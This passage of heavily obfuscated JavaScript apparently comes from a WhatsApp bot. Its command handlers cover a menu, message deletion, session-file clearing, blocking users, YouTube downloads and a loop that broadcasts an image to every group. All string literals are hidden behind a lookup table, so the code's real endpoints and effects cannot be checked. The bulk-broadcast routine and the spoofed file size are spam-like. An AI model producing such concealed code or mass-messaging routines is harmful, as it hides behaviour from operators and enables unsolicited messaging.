                                                {
                                                    'title': _0x2a5309[_0x5d4417(0xe86)],
                                                    'description': _0x2a5309[_0x5d4417(0xb3d)],
                                                    'id': _0x32fb46 + _0x5d4417(0xed1) + _0x156b97
                                                }
                                            ]
                                        }]
                                })
                            },
                            'viewOnce': !![]
                        }];
                return _0x2ba3dd[_0x5d4417(0xdda)][_0x5d4417(0x706)](..._0x5f2b08), _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], _0x2ba3dd, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x696)]: {
                let _0x14a398 = _0x5d4417(0xae7) + _0x5d4417(0x6ff) + _0x5d4417(0x444) + _0x5d4417(0x10fe) + _0x5d4417(0x1051) + _0xedb653[_0x5d4417(0xeee)][_0x5d4417(0xc6c)]('@')[0x121a + -0x3 * 0xc0a + 0x1204] + (_0x5d4417(0x278) + _0x5d4417(0x11d7)) + global[_0x5d4417(0xe8a)] + (_0x5d4417(0x1083) + _0x5d4417(0x11f9) + _0x5d4417(0xec5)) + (_0x57ed02[_0x5d4417(0x425)] ? _0x2a5309[_0x5d4417(0x700)] : _0x2a5309[_0x5d4417(0x707)]) + (_0x5d4417(0x759) + _0x5d4417(0xb81) + _0x5d4417(0x10ef) + _0x5d4417(0xaac) + _0x5d4417(0x4c2)) + _0x2a5309[_0x5d4417(0x5ca)](runtime, os[_0x5d4417(0x75e)]()) + (_0x5d4417(0x88d) + _0x5d4417(0x1045)) + (_0x47f98c ? _0x2a5309[_0x5d4417(0x688)] : _0x73fd3b ? _0x2a5309[_0x5d4417(0x1117)] : _0x2a5309[_0x5d4417(0x2e9)]) + (_0x5d4417(0x76a) + _0x5d4417(0x10af) + _0x5d4417(0x19e) + _0x5d4417(0x20a) + _0x5d4417(0xcb4) + _0x5d4417(0x5d9) + _0x5d4417(0xa29) + _0x5d4417(0x70a) + _0x5d4417(0xe3d) + _0x5d4417(0x496) + _0x5d4417(0x983) + _0x5d4417(0x1075) + _0x5d4417(0x1034) + _0x5d4417(0x291) + _0x5d4417(0x19f) + _0x5d4417(0x94c) + _0x5d4417(0x238) + _0x5d4417(0x11cd) + _0x5d4417(0x1b9) + _0x5d4417(0x10bb) + _0x5d4417(0x224) + _0x5d4417(0x815) + _0x5d4417(0x116e) + _0x5d4417(0x79a) + _0x5d4417(0x112d) + _0x5d4417(0x6fc) + _0x5d4417(0x97c) + _0x5d4417(0xaf7) + _0x5d4417(0xbab) + _0x5d4417(0xe61) + _0x5d4417(0x5fb) + _0x5d4417(0x2c9) + _0x5d4417(0x447) + _0x5d4417(0xb6a) + _0x5d4417(0xa69) + _0x5d4417(0x648) + _0x5d4417(0x11f7) + _0x5d4417(0x58d) + _0x5d4417(0x1041) + _0x5d4417(0xfd4) + _0x5d4417(0xd75) + _0x5d4417(0xebb) + _0x5d4417(0x8fd) + _0x5d4417(0x18b) + _0x5d4417(0xadb) + _0x5d4417(0x108e) + _0x5d4417(0xa50) + _0x5d4417(0x67f) + _0x5d4417(0x10e6) + _0x5d4417(0x62f) + _0x5d4417(0x113a) + _0x5d4417(0xea4) + _0x5d4417(0x2e7) + _0x5d4417(0x6c8) + _0x5d4417(0x374) + _0x5d4417(0xe9d) + _0x5d4417(0xd09) + _0x5d4417(0x783) + _0x5d4417(0x1150) + _0x5d4417(0x456) + _0x5d4417(0x903) + _0x5d4417(0x2b6) + _0x5d4417(0x870) + _0x5d4417(0x3cb) + _0x5d4417(0xdac) + _0x5d4417(0x3fe) + _0x5d4417(0x945) + _0x5d4417(0x1166) + _0x5d4417(0x978) + _0x5d4417(0x11c4) + _0x5d4417(0xfdf) + _0x5d4417(0x10b3) + _0x5d4417(0xd74) + _0x5d4417(0x26d) + _0x5d4417(0x991) + _0x5d4417(0xd2b) + _0x5d4417(0xbc5) + _0x5d4417(0x112d) + _0x5d4417(0xdd6) + _0x5d4417(0xe36) + _0x5d4417(0x70d) + _0x5d4417(0xdb5) + _0x5d4417(0xa5c) + _0x5d4417(0x1183) + _0x5d4417(0x245) + _0x5d4417(0xd95) + _0x5d4417(0x401) + _0x5d4417(0x1d8) + _0x5d4417(0xeab) + _0x5d4417(0xf66) + _0x5d4417(0x70d) + _0x5d4417(0xc17) + _0x5d4417(0x481) + _0x5d4417(0x10ea) + _0x5d4417(0x11a8) + _0x5d4417(0xfb3) + _0x5d4417(0xb57) + _0x5d4417(0xdff) + _0x5d4417(0x9f3) + _0x5d4417(0xed4) + (_0x5d4417(0xc73) + _0x5d4417(0xafe) + _0x5d4417(0xf9a) + _0x5d4417(0x527) + _0x5d4417(0x1041) + _0x5d4417(0x114d) + _0x5d4417(0x120b) + _0x5d4417(0x1103) + _0x5d4417(0x8de) + _0x5d4417(0x8fc) + _0x5d4417(0x3e3) + _0x5d4417(0xa9c) + _0x5d4417(0x74f) + _0x5d4417(0x500) + _0x5d4417(0x35f) + _0x5d4417(0xca1) + _0x5d4417(0x757) + _0x5d4417(0xb13) + _0x5d4417(0x92d) + _0x5d4417(0x2b7) + _0x5d4417(0x1fe) + _0x5d4417(0x116f) + _0x5d4417(0xbc4) + _0x5d4417(0x1041) + _0x5d4417(0x5cd) + _0x5d4417(0xd78) + _0x5d4417(0xa2c) + _0x5d4417(0x690) + _0x5d4417(0x9aa) + _0x5d4417(0x315) + _0x5d4417(0x11e2) + _0x5d4417(0xe9f) + _0x5d4417(0x9fe) + _0x5d4417(0xeea) + _0x5d4417(0x41f) + _0x5d4417(0x888) + _0x5d4417(0x1e3) + _0x5d4417(0x722) + _0x5d4417(0xa03) + _0x5d4417(0x10cc) + _0x5d4417(0x8a3) + _0x5d4417(0x8e7) + _0x5d4417(0x389) + _0x5d4417(0xff7) + _0x5d4417(0xfae) + _0x5d4417(0x428) + _0x5d4417(0x6dc) + _0x5d4417(0x1f3) + _0x5d4417(0xe6a) + _0x5d4417(0x5a2) + _0x5d4417(0x979) + _0x5d4417(0x901) + _0x5d4417(0xb24) + _0x5d4417(0xb50) + _0x5d4417(0x2dc) + _0x5d4417(0x6fa) + _0x5d4417(0x5d5) + _0x5d4417(0x1135) + _0x5d4417(0x10d3) + _0x5d4417(0x1c9) + _0x5d4417(0xfce) + _0x5d4417(0x70b) + _0x5d4417(0xf79) + _0x5d4417(0xbc3) + _0x5d4417(0xf6f) + _0x5d4417(0xcb8) + _0x5d4417(0x1105) + _0x5d4417(0xf4f) + _0x5d4417(0x1077) + _0x5d4417(0x2f2) + _0x5d4417(0xc31) + _0x5d4417(0x10ce) + _0x5d4417(0x529) + _0x5d4417(0x1109) + _0x5d4417(0xcdc) + _0x5d4417(0x669) + _0x5d4417(0x1a6) + _0x5d4417(0xc58) + _0x5d4417(0xc0c) + _0x5d4417(0x19e) + _0x5d4417(0x20a) + _0x5d4417(0x1de) + _0x5d4417(0x5f3) + _0x5d4417(0xd8a) + _0x5d4417(0xe52) + _0x5d4417(0x7db) + _0x5d4417(0xbcb) + _0x5d4417(0x4ab) + _0x5d4417(0x7d2) + _0x5d4417(0xd41) + _0x5d4417(0x402) + _0x5d4417(0x117d) + _0x5d4417(0x194) + _0x5d4417(0x861) + _0x5d4417(0xbfe) + _0x5d4417(0xd40) + _0x5d4417(0x261) + _0x5d4417(0x1130) + _0x5d4417(0x529) + _0x5d4417(0xd2a)) + (_0x5d4417(0x2d6) + _0x5d4417(0x218) + _0x5d4417(0xdb8) + _0x5d4417(0x399) + _0x5d4417(0x7de) + _0x5d4417(0x840) + _0x5d4417(0x10ec) + _0x5d4417(0x1041) + _0x5d4417(0x114d) + _0x5d4417(0x8f3) + _0x5d4417(0xa53) + _0x5d4417(0x11d3) + _0x5d4417(0x552) + _0x5d4417(0x244) + _0x5d4417(0xae1) + _0x5d4417(0xbe0) + _0x5d4417(0xf5a) + _0x5d4417(0x810) + _0x5d4417(0xe47) + _0x5d4417(0xa6a) + _0x5d4417(0xe4d) + _0x5d4417(0xffa) + _0x5d4417(0xae6) + _0x5d4417(0x922) + _0x5d4417(0xae6) + _0x5d4417(0x9f4) + _0x5d4417(0x19e) + _0x5d4417(0x20a) + _0x5d4417(0x742) + _0x5d4417(0x668) + _0x5d4417(0x8dd) + _0x5d4417(0xde2) + _0x5d4417(0x5a0) + _0x5d4417(0x1f6) + _0x5d4417(0x21e) + _0x5d4417(0x498) + _0x5d4417(0x74d) + _0x5d4417(0xcfe) + _0x5d4417(0x5bf) + _0x5d4417(0xaf0) + _0x5d4417(0x56f) + _0x5d4417(0x515) + _0x5d4417(0xb40) + _0x5d4417(0x8c2) + _0x5d4417(0x1194) + _0x5d4417(0x807) + _0x5d4417(0x3a1) + _0x5d4417(0x834) + _0x5d4417(0x376) + _0x5d4417(0xff5) + _0x5d4417(0x8ac) + _0x5d4417(0x1d8) + _0x5d4417(0xad9) + _0x5d4417(0xb49) + _0x5d4417(0x114f) + _0x5d4417(0x10bf) + _0x5d4417(0xbbf) + _0x5d4417(0x976) + _0x5d4417(0x267) + _0x5d4417(0xb20) + _0x5d4417(0xf00) + _0x5d4417(0xcd7) + _0x5d4417(0xc0a) + _0x5d4417(0x660)));
                const _0xff3175 = [
                        {
                            'buttonId': _0x5d4417(0xe59),
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0xbb7)] },
                            'type': 0x1
                        },
                        {
                            'buttonId': _0x5d4417(0x57e),
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x7e9)] },
                            'type': 0x1
                        }
                    ], _0x13123c = {
                        'footer': _0x5d4417(0x3dc) + _0x5d4417(0x950),
                        'buttons': _0xff3175,
                        'headerType': 0x1,
                        'viewOnce': !![],
                        'document': fs[_0x5d4417(0xf73) + 'nc'](_0x2a5309[_0x5d4417(0x2ee)]),
                        'fileName': _0x5d4417(0x414) + _0x5d4417(0x38a) + _0x5d4417(0xc54) + _0x5d4417(0x995),
                        'mimetype': _0x2a5309[_0x5d4417(0xf14)],
                        'fileLength': 0x5f5e0ff,
                        'caption': _0x14a398,
                        'contextInfo': {
                            'isForwarded': !![],
                            'mentionedJid': [_0xedb653[_0x5d4417(0xeee)]],
                            'forwardedNewsletterMessageInfo': {
                                'newsletterJid': global[_0x5d4417(0x754)],
                                'newsletterName': global[_0x5d4417(0x518) + 'n']
                            },
                            'externalAdReply': {
                                'title': botname + _0x5d4417(0x5c5) + versi,
                                'body': _0x5d4417(0x9e5),
                                'thumbnailUrl': global[_0x5d4417(0xd55)][_0x5d4417(0x2a0)],
                                'sourceUrl': linkSaluran,
                                'mediaType': 0x1,
                                'renderLargerThumbnail': !![]
                            }
                        }
                    }, _0x5d011d = [{
                            'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x8bf)] },
                            'type': 0x4,
                            'nativeFlowInfo': {
                                'name': _0x2a5309[_0x5d4417(0xdc6)],
                                'paramsJson': JSON[_0x5d4417(0x78f)]({
                                    'title': _0x2a5309[_0x5d4417(0x2aa)],
                                    'sections': [{
                                            'title': _0x2a5309[_0x5d4417(0xd45)],
                                            'highlight_label': _0x2a5309[_0x5d4417(0x4b3)],
                                            'rows': [
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x7b2)],
                                                    'description': _0x2a5309[_0x5d4417(0x1106)],
                                                    'id': _0x5d4417(0x102d)
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x41b)],
                                                    'description': _0x2a5309[_0x5d4417(0x8aa)],
                                                    'id': _0x5d4417(0x594)
                                                }
                                            ]
                                        }]
                                })
                            },
                            'viewOnce': !![]
                        }];
                return _0x13123c[_0x5d4417(0xdda)][_0x5d4417(0x706)](..._0x5d011d), _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], _0x13123c, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0xec4)]:
        case _0x2a5309[_0x5d4417(0x95b)]: {
                if (_0xedb653[_0x5d4417(0xe3e)]) {
                    if (!_0x47f98c && !_0xedb653[_0x5d4417(0xbf4)])
                        return _0x2a5309[_0x5d4417(0x86c)](_0x458b9f, mess[_0x5d4417(0x38f)]);
                    if (!_0xedb653[_0x5d4417(0x7eb)])
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x62e)]);
                    if (_0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0x563)])
                        _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                            'delete': {
                                'remoteJid': _0xedb653[_0x5d4417(0x9e2)],
                                'fromMe': !![],
                                'id': _0xedb653[_0x5d4417(0x7eb)]['id'],
                                'participant': _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0xeee)]
                            }
                        });
                    else {
                        if (!_0xedb653[_0x5d4417(0xd6d)])
                            return _0x2a5309[_0x5d4417(0x5ca)](_0x458b9f, mess[_0x5d4417(0x11bc)]);
                        _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                            'delete': {
                                'remoteJid': _0xedb653[_0x5d4417(0x9e2)],
                                'fromMe': ![],
                                'id': _0xedb653[_0x5d4417(0x7eb)]['id'],
                                'participant': _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0xeee)]
                            }
                        });
                    }
                } else {
                    if (!_0x47f98c)
                        return _0x2a5309[_0x5d4417(0x5ac)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                    if (!_0xedb653[_0x5d4417(0x7eb)])
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x87d)](_0x1ac933, _0x2a5309[_0x5d4417(0x188)]));
                    _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'delete': {
                            'remoteJid': _0xedb653[_0x5d4417(0x9e2)],
                            'fromMe': ![],
                            'id': _0xedb653[_0x5d4417(0x7eb)]['id'],
                            'participant': _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0xeee)]
                        }
                    });
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x231)]:
        case _0x2a5309[_0x5d4417(0x48c)]: {
                const _0x4bd364 = fs[_0x5d4417(0xb04) + 'c'](_0x2a5309[_0x5d4417(0x724)])[_0x5d4417(0xde7)](_0x2250c2 => _0x2250c2 !== _0x5d4417(0x745)), _0x537dfa = fs[_0x5d4417(0xb04) + 'c'](_0x2a5309[_0x5d4417(0x96d)])[_0x5d4417(0xde7)](_0x11688e => _0x11688e !== 'A');
                for (const _0x1d5e7c of _0x4bd364) {
                    await fs[_0x5d4417(0xf9e)](_0x2a5309[_0x5d4417(0x1027)](_0x2a5309[_0x5d4417(0x455)], _0x1d5e7c));
                }
                for (const _0x57ca4d of _0x537dfa) {
                    await fs[_0x5d4417(0xf9e)](_0x2a5309[_0x5d4417(0x616)](_0x2a5309[_0x5d4417(0xb66)], _0x57ca4d));
                }
                _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x479) + _0x5d4417(0x509) + _0x5d4417(0x989) + _0x5d4417(0x507) + _0x4bd364[_0x5d4417(0xf65)] + (_0x5d4417(0x37a) + _0x5d4417(0xc18)) + _0x537dfa[_0x5d4417(0xf65)] + (_0x5d4417(0x4d4) + _0x5d4417(0x789)));
            }
            break;
        case _0x2a5309[_0x5d4417(0x678)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x6c0)](_0x458b9f, global[_0x5d4417(0xa15)][_0x5d4417(0x41d)]);
                if (_0xedb653[_0x5d4417(0xe3e)] && !_0xedb653[_0x5d4417(0x7eb)] && !_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x87d)](_0x1ac933, _0x2a5309[_0x5d4417(0x316)]));
                const _0x418661 = !_0xedb653[_0x5d4417(0xe3e)] ? _0xedb653[_0x5d4417(0x9e2)] : _0xedb653[_0x5d4417(0x10f9) + 'id'][0x2f * 0x94 + -0x175e + -0x2 * 0x1e7] ? _0xedb653[_0x5d4417(0x10f9) + 'id'][0x1 * 0xf2b + -0x25c7 * -0x1 + -0x34f2] : _0xedb653[_0x5d4417(0x7eb)] ? _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0xeee)] : _0x156b97 ? _0x2a5309[_0x5d4417(0x65e)](_0x156b97[_0x5d4417(0xe51)](/[^0-9]/g, ''), _0x2a5309[_0x5d4417(0x11a3)]) : '';
                await _0x57ed02[_0x5d4417(0x1079) + _0x5d4417(0xf11)](_0x418661, _0x2a5309[_0x5d4417(0xf45)]);
                if (_0xedb653[_0x5d4417(0xe3e)])
                    _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'text': _0x5d4417(0x11b9) + _0x5d4417(0x715) + _0x5d4417(0x9a4) + _0x418661[_0x5d4417(0xc6c)]('@')[-0x13 * -0x131 + 0x1c25 + -0x32c8],
                        'mentions': [_0x418661]
                    }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x43c)]:
        case _0x2a5309[_0x5d4417(0x941)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x87d)](_0x458b9f, global[_0x5d4417(0xa15)][_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x764)](_0x1ac933, _0x2a5309[_0x5d4417(0xbca)]));
                if (!/image/[_0x5d4417(0x8cc)](_0x5a9802))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x6c0)](_0x1ac933, _0x2a5309[_0x5d4417(0xbca)]));
                const _0x4fa017 = await _0x57ed02[_0x5d4417(0x50e) + _0x5d4417(0xcd3) + _0x5d4417(0xbb3)](), _0x349046 = await Object[_0x5d4417(0x1af)](_0x4fa017);
                let _0x31fa3c = -0x25 * 0x3a + -0x1163 + 0x2dd * 0x9;
                const _0x54afb2 = _0x156b97, _0x113f73 = _0xedb653[_0x5d4417(0x9e2)], _0x2a6786 = await _0x57ed02[_0x5d4417(0x107b) + _0x5d4417(0x556) + _0x5d4417(0x37b)](_0x597f08);
                await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xd5b) + _0x5d4417(0xb2b) + _0x5d4417(0xec6) + _0x5d4417(0x900) + _0x5d4417(0xfe6) + _0x349046[_0x5d4417(0xf65)] + _0x5d4417(0x382)), await _0x57ed02[_0x5d4417(0x367) + 'e'](global[_0x5d4417(0x754)], {
                    'image': await fs[_0x5d4417(0xf73) + 'nc'](_0x2a6786),
                    'caption': _0x54afb2
                });
                for (let _0x278aa5 of _0x349046) {
                    if (global['db'][_0x5d4417(0x73a)][_0x278aa5] && global['db'][_0x5d4417(0x73a)][_0x278aa5][_0x5d4417(0xd0f) + 'pm'] && _0x2a5309[_0x5d4417(0xd08)](global['db'][_0x5d4417(0x73a)][_0x278aa5][_0x5d4417(0xd0f) + 'pm'], !![]))
                        continue;
                    try {
                        await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x278aa5, {
                            'footer': _0x5d4417(0xee4) + botname,
                            'buttons': [{
                                    'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                                    'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x1e5)] },
                                    'type': 0x4,
                                    'nativeFlowInfo': {
                                        'name': _0x2a5309[_0x5d4417(0xdc6)],
                                        'paramsJson': JSON[_0x5d4417(0x78f)]({
                                            'title': _0x2a5309[_0x5d4417(0xc3c)],
                                            'sections': [{
                                                    'title': _0x2a5309[_0x5d4417(0x6e0)],
                                                    'highlight_label': _0x2a5309[_0x5d4417(0x3b9)],
                                                    'rows': [
                                                        {
                                                            'title': _0x2a5309[_0x5d4417(0x92b)],
                                                            'id': _0x2a5309[_0x5d4417(0x52f)]
                                                        },
                                                        {
                                                            'title': _0x2a5309[_0x5d4417(0xe99)],
                                                            'id': _0x2a5309[_0x5d4417(0xd25)]
                                                        },
                                                        {
                                                            'title': _0x2a5309[_0x5d4417(0x49f)],
                                                            'id': _0x2a5309[_0x5d4417(0x9f1)]
                                                        },
                                                        {
                                                            'title': _0x2a5309[_0x5d4417(0x3c6)],
                                                            'id': _0x2a5309[_0x5d4417(0x1bb)]
                                                        }
                                                    ]
                                                }]
                                        })
                                    }
                                }],
                            'headerType': 0x1,
                            'viewOnce': !![],
                            'image': await fs[_0x5d4417(0xf73) + 'nc'](_0x2a6786),
                            'caption': '\x0a' + _0x54afb2 + '\x0a',
                            'contextInfo': {
                                'isForwarded': !![],
                                'forwardedNewsletterMessageInfo': {
                                    'newsletterJid': global[_0x5d4417(0x754)],
                                    'newsletterName': global[_0x5d4417(0x518) + 'n']
                                }
                            }
                        }, { 'quoted': _0x48a9c1 }), _0x31fa3c += -0xc87 + 0x1a4e + -0xdc6;
                    } catch {
                    }
                    await _0x2a5309[_0x5d4417(0xbaa)](sleep, global[_0x5d4417(0xf32)]);
                }
                await fs[_0x5d4417(0xf9e)](_0x2a6786), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x113f73, { 'text': _0x5d4417(0x1e7) + _0x5d4417(0x7cf) + _0x5d4417(0xd36) + _0x5d4417(0xb2e) + _0x5d4417(0x115a) + _0x31fa3c + _0x5d4417(0x382) }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x3e0)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x53a)](_0x1ac933, _0x2a5309[_0x5d4417(0x45b)]));
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '🔎',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
                let _0x77ffce = await _0x2a5309[_0x5d4417(0xa6d)](yts, _0x156b97);
                const _0x4bbea3 = await _0x77ffce[_0x5d4417(0x2ea)][0x2234 + -0x1587 + -0xcad];
                var _0x574e44 = await _0x2a5309[_0x5d4417(0x5ca)](fetchJson, _0x2a5309[_0x5d4417(0x2ab)](_0x2a5309[_0x5d4417(0x354)], _0x4bbea3[_0x5d4417(0xa2b)]));
                if (_0x574e44[_0x5d4417(0x7f0)][_0x5d4417(0xb1e)]) {
                    let _0x2aced7 = _0x574e44[_0x5d4417(0x7f0)][_0x5d4417(0xb1e)];
                    await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'audio': { 'url': _0x2aced7 },
                        'mimetype': _0x2a5309[_0x5d4417(0x894)],
                        'contextInfo': {
                            'externalAdReply': {
                                'thumbnailUrl': _0x4bbea3[_0x5d4417(0x96a)],
                                'title': _0x4bbea3[_0x5d4417(0xf6c)],
                                'body': _0x5d4417(0x10cb) + _0x4bbea3[_0x5d4417(0xa91)][_0x5d4417(0x277)] + (_0x5d4417(0x711) + _0x5d4417(0x38e)) + _0x4bbea3[_0x5d4417(0xd10)],
                                'sourceUrl': _0x4bbea3[_0x5d4417(0xa2b)],
                                'renderLargerThumbnail': !![],
                                'mediaType': 0x1
                            }
                        }
                    }, { 'quoted': _0xedb653 });
                } else
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x2d5)]);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
            }
            break;
        case _0x2a5309[_0x5d4417(0xf36)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xbaa)](_0x1ac933, _0x2a5309[_0x5d4417(0x45b)]));
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '🔎',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
                let _0x4b1e95 = await _0x2a5309[_0x5d4417(0x405)](yts, _0x156b97);
                const _0x8851af = await _0x4b1e95[_0x5d4417(0x2ea)][0x1c7b + 0x85f + -0x35 * 0xb2];
                var _0x574e44 = await _0x2a5309[_0x5d4417(0x65a)](fetchJson, _0x2a5309[_0x5d4417(0x3e6)](_0x2a5309[_0x5d4417(0xc67)], _0x8851af[_0x5d4417(0xa2b)]));
                if (_0x574e44[_0x5d4417(0x7f0)][_0x5d4417(0x570)]) {
                    let _0x409f50 = _0x574e44[_0x5d4417(0x7f0)][_0x5d4417(0x570)];
                    await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'video': { 'url': _0x409f50 },
                        'ptv': !![],
                        'mimetype': _0x2a5309[_0x5d4417(0x510)]
                    }, { 'quoted': _0xedb653 });
                } else
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x2d5)]);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
            }
            break;
        case _0x2a5309[_0x5d4417(0xf01)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xbaa)](_0x1ac933, _0x2a5309[_0x5d4417(0x4ea)]));
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '🔎',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
                let _0x20331d = await _0x2a5309[_0x5d4417(0x86c)](yts, _0x156b97);
                const _0x5b45d8 = _0x20331d[_0x5d4417(0x2ea)];
                let _0x1ec591 = _0x2a5309[_0x5d4417(0x5da)];
                for (let _0x91526c of _0x5b45d8) {
                    _0x1ec591 += _0x5d4417(0x967) + '*\x20' + _0x91526c[_0x5d4417(0xf6c)] + (_0x5d4417(0xc36) + _0x5d4417(0x59a)) + _0x91526c[_0x5d4417(0xd10)] + (_0x5d4417(0xc5d) + _0x5d4417(0x59a)) + _0x91526c[_0x5d4417(0xaf5)] + (_0x5d4417(0x10a7) + _0x5d4417(0x1151)) + _0x91526c[_0x5d4417(0x6e8)] + (_0x5d4417(0x9fb) + _0x5d4417(0x59a)) + (_0x91526c?.[_0x5d4417(0xa91)]?.[_0x5d4417(0x277)] || _0x2a5309[_0x5d4417(0x1169)]) + (_0x5d4417(0x84d) + _0x5d4417(0x59a)) + _0x91526c[_0x5d4417(0xa2b)] + '\x0a\x0a';
                }
                await _0xedb653[_0x5d4417(0x105d)](_0x1ec591), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
            }
            break;
        case _0x2a5309[_0x5d4417(0xb19)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xbaa)](_0x1ac933, _0x2a5309[_0x5d4417(0x689)]));
                if (!_0x156b97[_0x5d4417(0x5cc)](_0x2a5309[_0x5d4417(0x377)]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x7f7)]);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '🕖',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
                var _0x574e44 = await _0x2a5309[_0x5d4417(0x985)](fetchJson, _0x2a5309[_0x5d4417(0x1ed)](_0x2a5309[_0x5d4417(0x354)], _0x156b97));
                if (_0x574e44[_0x5d4417(0x7f0)][_0x5d4417(0xb1e)]) {
                    let _0x2c8a99 = _0x574e44[_0x5d4417(0x7f0)][_0x5d4417(0xb1e)];
                    await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'audio': { 'url': _0x2c8a99 },
                        'mimetype': _0x2a5309[_0x5d4417(0x894)]
                    }, { 'quoted': _0xedb653 });
                } else
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x2d5)]);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
            }
            break;
        case _0x2a5309[_0x5d4417(0x1017)]:
        case _0x2a5309[_0x5d4417(0x6cd)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xea8)](_0x458b9f, global[_0x5d4417(0xa15)][_0x5d4417(0x41d)]);
                if (_0xedb653[_0x5d4417(0xe3e)] && !_0xedb653[_0x5d4417(0x7eb)] && !_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x53a)](_0x1ac933, _0x2a5309[_0x5d4417(0x316)]));
                const _0x3b47bb = !_0xedb653[_0x5d4417(0xe3e)] ? _0xedb653[_0x5d4417(0x9e2)] : _0xedb653[_0x5d4417(0x10f9) + 'id'][-0x24f0 + 0x97 * -0x1d + 0x360b] ? _0xedb653[_0x5d4417(0x10f9) + 'id'][-0xa07 + -0x7 * -0x4e7 + -0x184a] : _0xedb653[_0x5d4417(0x7eb)] ? _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0xeee)] : _0x156b97 ? _0x2a5309[_0x5d4417(0x11bd)](_0x156b97[_0x5d4417(0xe51)](/[^0-9]/g, ''), _0x2a5309[_0x5d4417(0x11a3)]) : '';
                await _0x57ed02[_0x5d4417(0x1079) + _0x5d4417(0xf11)](_0x3b47bb, _0x2a5309[_0x5d4417(0x1017)]);
